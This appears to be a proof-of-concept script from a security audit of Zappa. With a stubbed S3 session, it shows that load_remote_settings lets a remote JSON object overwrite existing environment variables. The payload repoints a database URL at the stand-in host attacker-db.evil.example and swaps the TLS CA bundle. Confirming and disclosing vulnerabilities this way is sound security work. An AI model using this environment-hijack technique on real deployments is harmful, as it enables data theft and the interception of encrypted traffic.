#!/usr/bin/env python3
"""VULN-026 — remote_env S3 JSON overwrites existing os.environ keys at cold start.

Vulnerable code : targets/Zappa/zappa/handler.py:244-284 (load_remote_settings), sink :274-281
Vulnerability   : CWE-15 External Control of System/Config Setting.
Surface         : B (S3-object control) — requires `remote_env` set + write to that S3 object.

Mechanism (plain English)
-------------------------
When `remote_env` (an s3:// URL) is configured, at cold start Zappa reads that S3
JSON object and copies every key into `os.environ`, **overwriting existing keys**:

    settings_dict = json.loads(content)
    for key, value in settings_dict.items():
        os.environ[str(key)] = value          # handler.py:281 — clobbers existing values

So whoever can write that S3 object controls the function's environment: they can
overwrite `DJANGO_SETTINGS_MODULE`, weaken TLS via `REQUESTS_CA_BUNDLE`, replace
secrets/DB URLs, or inject `LD_PRELOAD`-style vars — silently, at every cold start.

What a successful run proves
----------------------------
Feeding the real `load_remote_settings` an S3 JSON (stubbed) that names an
already-set env var causes that existing value to be OVERWRITTEN.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-026"

_DRIVER = r"""
import json, os, types
from zappa.handler import LambdaHandler
os.environ["APP_DB_URL"] = "postgres://real-db.internal/app"     # a pre-existing, trusted env value
lh = LambdaHandler.__new__(LambdaHandler)
lh.settings = types.SimpleNamespace(LOG_LEVEL="INFO")
attacker_json = json.dumps({
    "APP_DB_URL": "postgres://attacker-db.evil.example/steal",   # overwrite an EXISTING key
    "REQUESTS_CA_BUNDLE": "/tmp/attacker-ca.pem",                # weaken TLS trust
}).encode()
class _Sess:
    def resource(self, name):
        class S3:
            def Object(self, b, k):
                class O:
                    def get(self):
                        class B:
                            def read(self, *a): return attacker_json
                        return {"Body": B()}
                return O()
        return S3()
lh._get_boto_session = lambda: _Sess()
lh.load_remote_settings("attacker-bucket", "env.json")           # <-- REAL target code
print(json.dumps({"db_url_now": os.environ.get("APP_DB_URL"),
                  "ca_bundle_now": os.environ.get("REQUESTS_CA_BUNDLE")}))
"""


def main():
    banner(VULN, "remote_env S3 JSON overwrites existing os.environ at cold start",
           "zappa/handler.py:244-284 load_remote_settings (sink :281)")

    log("SETUP", "pre-seeding a trusted env var APP_DB_URL=postgres://real-db.internal/app")
    log("STEP", "load_remote_settings reads attacker S3 JSON that re-defines APP_DB_URL + REQUESTS_CA_BUNDLE")
    cp = lab_python(_DRIVER)
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    log("INFO", f"APP_DB_URL after load        = {res['db_url_now']!r}")
    log("INFO", f"REQUESTS_CA_BUNDLE after load = {res['ca_bundle_now']!r}")

    overwritten = res["db_url_now"] == "postgres://attacker-db.evil.example/steal"
    injected = res["ca_bundle_now"] == "/tmp/attacker-ca.pem"

    if overwritten and injected:
        log("PROOF", "the S3 JSON overwrote the pre-existing APP_DB_URL (redirecting the DB to an attacker "
                     "host) and injected REQUESTS_CA_BUNDLE (weakening TLS) — whoever can write the remote_env "
                     "object controls the function's environment at every cold start.")
        log("OK", "exploit confirmed — remote_env overwrites/injects environment variables")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — remote_env S3 JSON overwrites existing os.environ keys")
        return 0
    log("FAIL", f"overwritten={overwritten} injected={injected}")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
